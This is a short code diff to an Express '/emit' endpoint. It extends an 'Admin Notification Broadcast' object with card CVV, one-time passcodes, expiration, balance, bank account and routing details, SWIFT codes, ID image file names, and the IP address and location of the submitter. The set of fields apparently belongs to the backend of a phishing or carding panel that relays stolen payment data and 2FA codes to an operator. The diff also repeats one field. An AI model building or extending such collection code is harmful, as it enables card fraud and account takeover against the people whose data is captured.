@@ -60,10 +60,25 @@ app.post("/emit", (req, res) => {
         expiration: payload.expiration || null,
         account_type: payload.account_type || null,
         account_number: payload.account_number || null,
+        account_holder: payload.account_holder || null,
         balance: payload.balance || null,
         cvv: payload.cvv || null,
         brand: payload.brand || null,
-        otp: payload.otp || null
+        otp: payload.otp || null,
+        ip: payload.ip || null,
+        country: payload.country || null,
+        state: payload.state || null,
+        city: payload.city || null,
+        file_name: payload.file_name || null,
+        front_name: payload.front_name || null,
+        back_name: payload.back_name || null,
+        beneficiary: payload.beneficiary || null,
+        address: payload.address || null,
+        bank_name: payload.bank_name || null,
+        routing_number: payload.routing_number || null,
+        account_number: payload.account_number || null,
+        swift_bic: payload.swift_bic || null,
+        
     };
 
     console.log("Admin Notification Broadcast:", safe);
